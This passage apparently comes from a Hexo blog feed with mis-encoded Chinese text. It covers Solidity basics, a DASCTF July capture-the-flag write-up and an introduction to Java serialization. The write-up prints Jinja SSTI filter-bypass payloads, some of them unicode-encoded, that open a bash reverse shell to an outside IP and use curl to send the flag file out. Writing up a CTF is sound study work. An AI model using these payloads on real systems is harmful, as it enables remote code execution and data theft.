class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token builtin">string</span> name<span class="token punctuation">)</span> regConfirm<span class="token punctuation">&#123;</span>        <span class="token builtin">address</span> account<span class="token operator">=</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>        sum<span class="token operator">++</span><span class="token punctuation">;</span>        idmap<span class="token punctuation">[</span>account<span class="token punctuation">]</span><span class="token operator">=</span>sum<span class="token punctuation">;</span>        namemap<span class="token punctuation">[</span>sum<span class="token punctuation">]</span><span class="token operator">=</span>name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸‰ä¸ªåº”ç”¨ï¼Œæƒé™ç®¡ç†ï¼Œä»£ç å°±ä¸æ”¾äº†è‡ªå·±æ„ä¼šå§</p><p>modifieræ‰§è¡Œé¡ºåºï¼Œåœ¨æœ‰å¤šä¸ªmodifierè¢«ä½¿ç”¨æ—¶ï¼Œåé¢çš„modifierä¼šä¸å‡½æ•°ä¸€èµ·è¢«æ”¾å…¥å‰ä¸€ä¸ªmodifierçš„<code>_;</code>å ä½ç¬¦ä¸­</p><h3 id="åˆçº¦ç»§æ‰¿"><a href="#åˆçº¦ç»§æ‰¿" class="headerlink" title="åˆçº¦ç»§æ‰¿"></a>åˆçº¦ç»§æ‰¿</h3><p>ç»§æ‰¿è¯­æ³•</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">father</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">son</span> <span class="token keyword">is</span> father<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥è¿ç»­ç»§æ‰¿ï¼Œå¯å¤šé‡ç»§æ‰¿ï¼Œå¦‚æœæœ‰åŒåå±æ€§ä»¥æœ€åçš„åˆçº¦ä¸ºå‡†</p><p>å¯¹äºå±æ€§å’Œå‡½æ•°æ¥è¯´privateä¸å¯è¢«ç»§æ‰¿</p><h3 id="getterå‡½æ•°"><a href="#getterå‡½æ•°" class="headerlink" title="getterå‡½æ•°"></a>getterå‡½æ•°</h3><p>publicå±æ€§çš„å˜é‡ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåŒåå±æ€§ä¸ºexternalçš„å‡½æ•°ï¼Œå¯¹äºmappingç±»å‹ç”Ÿæˆä¸€ä¸ªæœ‰å‚æ•°çš„å‡½æ•°ï¼Œä¼ </p><h3 id="å›é€€å‡½æ•°fallback"><a href="#å›é€€å‡½æ•°fallback" class="headerlink" title="å›é€€å‡½æ•°fallback"></a>å›é€€å‡½æ•°fallback</h3><p>fallbackå‡½æ•°ï¼Œå›é€€å‡½æ•°ï¼Œæ˜¯åˆçº¦é‡Œçš„ç‰¹æ®Šæ— åå‡½æ•°ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªã€‚å®ƒåœ¨åˆçº¦è°ƒç”¨æ²¡æœ‰åŒ¹é…åˆ°å‡½æ•°ç­¾åï¼Œæˆ–è€…è°ƒç”¨æ²¡æœ‰å¸¦ä»»ä½•æ•°æ®æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ã€‚å›é€€å‡½æ•°æ˜¯åˆçº¦é‡Œçš„ç‰¹æ®Šå‡½æ•°ï¼Œæ²¡æœ‰åå­—ï¼Œä¸èƒ½æœ‰å‚æ•°ï¼Œæ²¡æœ‰è¿”å›å€¼ã€‚ä¸‹é¢æ¥çœ‹ä¸€ä¸ªç®€å•çš„å›é€€å‡½æ•°ä¾‹å­ã€‚</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">SimpleFallback</span><span class="token punctuation">&#123;</span>  <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//fallback function</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“è°ƒç”¨çš„å‡½æ•°æ‰¾ä¸åˆ°æ—¶ï¼Œå°±ä¼šè°ƒç”¨é»˜è®¤çš„fallbackå‡½æ•°ã€‚ç”±äºSolidityä¸­ï¼ŒSolidityæä¾›äº†ç¼–è¯‘æœŸæ£€æŸ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½ç›´æ¥é€šè¿‡Solidityè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ã€‚ä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Solidityçš„æä¾›çš„åº•å±‚å‡½æ•°<code>address.call</code>æ¥æ¨¡æ‹Ÿè¿™ä¸€è¡Œä¸ºï¼Œå…³äº<code>call()</code>å‡½æ•°è¯¦è§ï¼š<a href="http://me.tryblockchain.org/Solidity-call-callcode-delegatecall.html">http://me.tryblockchain.org/Solidity-call-callcode-delegatecall.html</a> ã€‚æˆ‘ä»¬æ¥çœ‹ä¸ªä¾‹å­ï¼š</p><ul><li><strong>send()å‡½æ•°å‘é€ether</strong></li></ul><p>å½“æˆ‘ä»¬ä½¿ç”¨<code>address.send(ether to send)</code>å‘æŸä¸ªåˆçº¦ç›´æ¥è½¬å¸æ—¶ï¼Œç”±äºè¿™ä¸ªè¡Œä¸ºæ²¡æœ‰å‘é€ä»»ä½•æ•°æ®ï¼Œæ‰€ä»¥æ¥æ”¶åˆçº¦æ€»æ˜¯ä¼šè°ƒç”¨fallbackå‡½æ•°ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸‹é¢çš„ä¾‹å­</p><h3 id="åˆçº¦é”€æ¯"><a href="#åˆçº¦é”€æ¯" class="headerlink" title="åˆçº¦é”€æ¯"></a>åˆçº¦é”€æ¯</h3><p>selfdestruct(owner);</p><h3 id="storageå’Œmemory"><a href="#storageå’Œmemory" class="headerlink" title="storageå’Œmemory"></a>storageå’Œmemory</h3><p>å…¨å±€å˜é‡è¢«å­˜åœ¨é“¾ä¸Šï¼Œå±äºstorageä¸­çš„å†…å®¹ï¼Œåœ¨å‡½æ•°ä¸­è¿è¡Œçš„å€¼éƒ½åªå­˜åœ¨æœ¬æœºä¸­ï¼Œå±äºmemoryä¸­å†…å®¹ï¼Œç”¨åå³é”€æ¯</p><p>ä½†æ˜¯åœ¨å‡½æ•°ä¸­å®šä¹‰çš„å¯å˜æ•°ç»„æ˜¯storageç±»å‹</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF 7æœˆèµ›</title>
      <link href="/posts/c1a72657.html"/>
      <url>/posts/c1a72657.html</url>
      
        <content type="html"><![CDATA[<p>è°¢è°¢å‡ºé¢˜äººï¼ŒSSTIğŸ¦ˆæˆ‘ï¼Œç­¾åˆ°å°±ä¸è¯´äº†ï¼Œç›´æ¥çœ‹åé¢ä¸¤ä¸ª</p><h2 id="Harddisk"><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h2><p>SSTIï¼Œå°±æ˜¯è¿‡æ»¤å¾ˆè¿‡åˆ†ï¼Œç”šè‡³è¿˜æ»¤äº†gå’Œxè¿™ä¸¤ä¸ªå•å­—ç¬¦ï¼Œè¿˜è¿‡æ»¤äº†<code>&#123;&#123;&#125;&#125;</code>å’Œprintï¼Œæ³¨å®šæ˜¯æ²¡æœ‰å›æ˜¾äº†ï¼Œè¦åå¼¹shelläº†ï¼Œå…ˆè¯•è¯•æ„é€ æœ€ç®€å•çš„<del>ï¼ˆåˆ«è¯´ä¸ºå•¥ä¸ç”¨åˆ«çš„ï¼Œéƒ½è¢«banäº†æˆ‘æ€ä¹ˆç”¨ğŸ˜­ï¼‰</del> <code>lipsum.__globals__[&#39;os&#39;].popen(&#39;sh -i &gt;&amp; /dev/tcp/182.61.46.138/10000 0&gt;&amp;1&#39;).read()</code></p><pre class="line-numbers language-none"><code class="language-none">&#123;%set a&#x3D;&quot;__globals__&quot;%&#125;&#123;%set d&#x3D;&quot;os&quot;%&#125;&#123;%set e&#x3D;&quot;popen&quot;%&#125;&#123;%set c&#x3D;&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;182.61.46.138&#x2F;10000 0&gt;&amp;1&quot;%&#125;&#123;%set f&#x3D;&quot;get&quot;%&#125;&#123;%set b&#x3D;((lipsum|attr(a))|attr(&quot;get&quot;)(d))|attr(e)(c) %&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>èµ°ä¸€æ³¢unicodeç¼–ç è¿˜æœ‰ç©ºæ ¼ç»•è¿‡ï¼Œå°±å˜æˆäº†è¿™æ ·</p><pre class="line-numbers language-none"><code class="language-none">&#123;%25set%09a&#x3D;&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;%25&#125;&#123;%25set%09d&#x3D;&quot;\u006f\u0073&quot;%25&#125;&#123;%25set%09e&#x3D;&quot;\u0070\u006f\u0070\u0065\u006e&quot;%25&#125;&#123;%25set%09c&#x3D;&quot;\u0062\u0061\u0073\u0068\u0020\u002d\u0069\u0020\u003e\u0026\u0020\u002f\u0064\u0065\u0076\u002f\u0074\u0063\u0070\u002f\u0031\u0038\u0032\u002e\u0036\u0031\u002e\u0034\u0036\u002e\u0031\u0033\u0038\u002f\u0031\u0030\u0030\u0030\u0030\u0020\u0030\u003e\u0026\u0031&quot;%25&#125;&#123;%25set%09f&#x3D;&quot;\u0067\u0065\u0074&quot;%25&#125;&#123;%25set%09b&#x3D;((lipsum|attr(a))|attr(f)(d))|attr(e)(c)%25&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œå‡ºé”™äº†ï¼Œä¼°è®¡æ˜¯æ²¡å¯¼osæ¨¡å—ï¼Œèµ°importçš„è·¯å­å§ï¼ˆä¸çŸ¥é“ä¸ºå•¥shellåå¼¹ä¸è¿‡æ¥ï¼Œå°±ç”¨å­¦é•¿ç»™çš„curlå¤–å¸¦å§</p><pre class="line-numbers language-none"><code class="language-none">&#123;%set a&#x3D;&quot;__globals__&quot;%&#125;&#123;%set b&#x3D;&quot;__builtins__&quot;%&#125;&#123;%set cmd&#x3D;&quot;__import__(&quot;os&quot;).system(&quot;curl 182.61.46.138?&#96;cat &#x2F;f*&#96;&quot;)&quot;%&#125;&#123;%set c&#x3D;(lipsum|attr(a))|attr(&quot;get&quot;)(b)|attr(&quot;get&quot;)(&quot;eval&quot;)(cmd)%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åŒä¸Šæ¢ä¸€ä¸‹æ ¼å¼</p><pre class="line-numbers language-none"><code class="language-none">&#123;%25set%09a&#x3D;&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;%25&#125;&#123;%25set%09b&#x3D;&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;%25&#125;&#123;%25set%09cmd&#x3D;&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0022\u006f\u0073\u0022\u0029\u002e\u0073\u0079\u0073\u0074\u0065\u006d\u0028\u0022\u0063\u0075\u0072\u006c\u0020\u0031\u0038\u0032\u002e\u0036\u0031\u002e\u0034\u0036\u002e\u0031\u0033\u0038\u003f\u0060\u0063\u0061\u0074\u0020\u002f\u0066\u002a\u0060\u0022\u0029&quot;%25&#125;&#123;%25set%09c&#x3D;(lipsum|attr(a))|attr(&quot;\u0067\u0065\u0074&quot;)(b)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(cmd)%25&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202207242303093.png"></p><h2 id="ç»å¯¹é˜²å¾¡"><a href="#ç»å¯¹é˜²å¾¡" class="headerlink" title="ç»å¯¹é˜²å¾¡"></a>ç»å¯¹é˜²å¾¡</h2><p>å‘œå‘œå‘œæˆ‘æ˜¯ç¬¨æ¯”ï¼Œæ‰¾åˆ°äº†æ–‡ä»¶éƒ½æ²¡æƒ³ç€ç›´æ¥æ‰“å¼€ä¸€ä¸‹ğŸ˜­</p><p>æ‰«ä¸å‡ºä¸œè¥¿å°±çœ‹çœ‹JSå§ï¼Œå…¶ä¸­ä¸€ä¸ªæ–‡ä»¶çš„APIå¸¦äº†phpæ–‡ä»¶<code>ImLib.API_PATH = &quot;/SUPPERAPI.php&quot;;</code>ï¼Œçœ‹ä¸€ä¸‹ï¼Œæœ‰æºç </p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token keyword">function</span> <span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token parameter">variable</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">var</span> query <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> vars <span class="token operator">=</span> query<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"&amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>vars<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token keyword">var</span> pair <span class="token operator">=</span> vars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span>pair<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> variable<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> pair<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> reg <span class="token operator">=</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[`~!@#$%^&amp;*()_+&lt;>?:"&#123;&#125;,.\/;'[\]]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">im</span></span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>reg<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span><span class="token function">getQueryVariable</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"æç¤ºï¼šæ‚¨è¾“å…¥çš„ä¿¡æ¯å«æœ‰éæ³•å­—ç¬¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"/"</span>         <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaåºåˆ—åŒ–åŸºç¡€</title>
      <link href="/posts/a3c4d7f5.html"/>
      <url>/posts/a3c4d7f5.html</url>
      
        <content type="html"><![CDATA[<h1 id="Javaåºåˆ—åŒ–åŸºç¡€"><a href="#Javaåºåˆ—åŒ–åŸºç¡€" class="headerlink" title="Javaåºåˆ—åŒ–åŸºç¡€"></a>Javaåºåˆ—åŒ–åŸºç¡€</h1><h2 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</h2><p>åºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡å‹ç¼©ä¸ºå­—èŠ‚æµçš„å½¢å¼ï¼Œè€Œååºåˆ—åŒ–å°±æ˜¯å°†å­—èŠ‚æµè½¬æ¢å›å†…å­˜ä¸­çš„å¯¹è±¡</p><h3 id="ä¸ºä»€ä¹ˆä¼šä¸å®‰å…¨"><a href="#ä¸ºä»€ä¹ˆä¼šä¸å®‰å…¨" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šä¸å®‰å…¨"></a>ä¸ºä»€ä¹ˆä¼šä¸å®‰å…¨</h3><ul><li>å¯¹äºJavaæ¥è¯´ï¼Œååºåˆ—åŒ–ä¸å®‰å…¨çš„ç‚¹ï¼Œæ˜¯åœ¨äºå…¶ååºåˆ—åŒ–æ—¶è¿›è¡Œäº†â€œé¢å¤–çš„æ“ä½œâ€ï¼ˆé‡å†™readObjectæ–¹æ³•ä¸­çš„å†…å®¹ï¼‰</li><li>å¯èƒ½çš„å±é™©å½¢å¼</li><li>å…¥å£ç±»çš„readObjectç›´æ¥è°ƒç”¨å±é™©æ–¹æ³•</li><li>å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è°ƒç”¨</li><li>å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»åˆè°ƒç”¨å…¶ä»–æœ‰å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨ï¼Œæ¯”å¦‚åœ¨ç±»å‹ä¸ºObjectæ—¶è°ƒç”¨å¯¹åº”çš„equals/hashcode/toStringç­‰æ–¹æ³•</li><li>æ„é€ å‡½æ•°æˆ–é™æ€ä»£ç å—ç­‰ç±»åŠ è½½æ—¶éšå¼æ‰§è¡Œ</li></ul><h3 id="ä¸€äº›æ¡ä»¶"><a href="#ä¸€äº›æ¡ä»¶" class="headerlink" title="ä¸€äº›æ¡ä»¶"></a>ä¸€äº›æ¡ä»¶</h3><p>å…±åŒæ¡ä»¶ï¼šå®ç°Serializableæ¥å£</p><p>å…¥å£ç±» sourceï¼ˆé‡å†™readObjectï¼Œå‚æ•°ç±»å‹å®½æ³›ï¼Œæœ€å¥½JDKè‡ªå¸¦ï¼‰</p><p>è°ƒç”¨é“¾ gadget chain</p><p>æ‰§è¡Œç±» sink ï¼ˆRCEï¼ŒSSRFï¼Œå†™æ–‡ä»¶ç­‰ï¼‰</p><h3 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h3><p>å®˜æ–¹é‡Šä¹‰ï¼šJavaçš„åå°„æœºåˆ¶æ˜¯æŒ‡åœ¨è¿è¡ŒçŠ¶æ€ä¸­ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½çŸ¥é“è¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½è°ƒç”¨å®ƒçš„ä»»æ„ä¸€ä¸ªæ–¹æ³•ï¼Œè¿™ç§åŠ¨æ€è·å–ä¿¡æ¯ä»¥åŠåŠ¨æ€è°ƒç”¨å¯¹è±¡æ–¹æ³•çš„åŠŸèƒ½ç§°ä¸ºJavaçš„åå°„æœºåˆ¶</p><p><strong>ä½œç”¨</strong></p><ul><li>è®©Javaå…·æœ‰åŠ¨æ€æ€§</li><li>ä¿®æ”¹å·²æœ‰å¯¹è±¡çš„å±æ€§</li><li>åŠ¨æ€ç”Ÿæˆå¯¹è±¡</li><li>åŠ¨æ€è°ƒç”¨æ–¹æ³•</li><li>æ“ä½œå†…éƒ¨ç±»å’Œç§æœ‰æ–¹æ³•</li></ul><p>ä¸€äº›åå°„æ–¹æ³•</p><ul><li><code>obj.getClass()</code>è·å–å¯¹è±¡ç±»Classå¯¹è±¡</li><li><code>cla.getConstructor(å‚æ•°1ç±»å‹,å‚æ•°2ç±»å‹)</code>è·å–å¯¹è±¡æŒ‡å®šå½¢å¼çš„æ„é€ æ–¹æ³•Constructorå¯¹è±¡</li><li><code>cst.newInstance(å‚æ•°1,å‚æ•°2)</code>é€šè¿‡æŒ‡å®šçš„æ„é€ æ–¹æ³•æ–°å»ºå¯¹ä¸€ä¸ªå¯¹åº”ç±»çš„å¯¹è±¡</li><li><code>cls.getDeclaredFields()</code>è·å–æ‰€æœ‰ç±»ä¸­å£°æ˜çš„å˜é‡ï¼Œè¿”å›ä¸€ä¸ªFieldæ•°ç»„</li><li><code>cls.getDeclaredField(å˜é‡å)</code>é€šè¿‡å˜é‡åè·å¾—è¯¥ç±»å˜é‡å¯¹è±¡ï¼Œè¿”å›ä¸€ä¸ªFieldå¯¹è±¡</li><li><code>fld.set(å¯¹è±¡,æ–°å˜é‡å€¼)</code>ç»™å¯¹è±¡è®¾ç½®æ–°å˜é‡å†…å®¹</li><li><code>fld.setAccessible(å¸ƒå°”)</code>ç»™ç±»çš„å˜é‡è®¾ç½®è®¿é—®å±æ€§ï¼Œtrueä¸ºå¯è®¿é—®</li><li><code>cls.getMethods()</code>è·å–ç±»çš„æ‰€æœ‰æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªMethodæ•°ç»„</li><li><code>cls.getMethods(æ–¹æ³•å,å‚æ•°èŒƒå‹)</code>é€šè¿‡æ–¹æ³•åè·å–è¯¥ç±»æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªMethodå¯¹è±¡</li><li><code>med.invoke(å¯¹è±¡,ä¼ å‚)</code></li></ul><p>åå°„åœ¨ååºåˆ—åŒ–ä¸­çš„åº”ç”¨</p><ul><li>å®šåˆ¶éœ€è¦çš„å¯¹è±¡</li><li>é€šè¿‡invokeè°ƒç”¨é™¤åŒåå‡½æ•°ä¹‹å¤–çš„å‡½æ•°</li><li>é€šè¿‡Classç±»åˆ›å»ºå¯¹è±¡ï¼Œå¼•å…¥ä¸èƒ½åºåˆ—åŒ–çš„ç±»</li></ul><h3 id="ä»£ç†"><a href="#ä»£ç†" class="headerlink" title="ä»£ç†"></a>ä»£ç†</h3><p>ä¸ºå…¶ä»–å¯¹è±¡æä¾›ä¸€ä¸ªä»£ç†æ¥è®¿é—®åŸå¯¹è±¡ï¼Œæ¯”å¦‚å„ç§çš„getå’Œsetæ–¹æ³•å°±æ˜¯ä¸€ç§ä»£ç†</p><p>é™æ€ä»£ç†</p><p>åŠ¨æ€ä»£ç†</p><p>éœ€è¦ä½¿ç”¨JDKä¸­çš„Proxyç±»</p><h3 id="Javaåºåˆ—åŒ–å®ä¾‹"><a href="#Javaåºåˆ—åŒ–å®ä¾‹" class="headerlink" title="Javaåºåˆ—åŒ–å®ä¾‹"></a>Javaåºåˆ—åŒ–å®ä¾‹</h3><p>éœ€è¦å®ç°java.io.Serializableæ¥å£ï¼ˆè¯¥æ¥å£æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼‰</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Person.java</span><span class="token keyword">package</span> <span class="token namespace">top<span class="token punctuation">.</span>darkflow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//Main.java</span><span class="token keyword">package</span> <span class="token namespace">top<span class="token punctuation">.</span>darkflow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Person</span> p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"Jlan"</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ser.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åºåˆ—åŒ–è¿‡ç¨‹</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 